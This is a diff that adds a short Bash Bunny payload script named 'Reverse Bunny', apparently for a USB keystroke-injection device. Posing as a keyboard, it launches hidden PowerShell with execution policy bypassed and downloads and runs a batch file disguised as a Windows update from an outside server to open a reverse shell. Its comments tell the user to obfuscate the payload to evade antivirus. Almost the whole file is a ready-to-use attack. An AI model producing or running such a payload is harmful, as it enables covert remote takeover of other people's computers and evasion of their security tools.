@@ -1,0 +1,22 @@
+# Title:         Reverse Bunny
+# Author:        Chandler Rose
+# Version:       1.0
+# Firmware:      >= 1.7
+
+# Downloads and executes a reverse shell using powershell on the target machine.
+# You will have to create the reverse shell payload yourself.
+ 
+# Setup The Attack
+# 1. Create the payload.
+# 2. Obfuscate the payload to avoid AV.
+# 3. Setup listener locally or remotely.
+# 3. Plug in the bunny and run the attack against the target.
+
+# Enable Attack Mode
+LED SETUP
+ATTACKMODE HID 
+
+# Open powershell and download/execute the reverse shell .bat file. 
+LED ATTACK
+RUN WIN Powershell -nop -ex Bypass -w Hidden "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.5:8000/WindowsUpdate.exe.bat')"
+LED FINISH
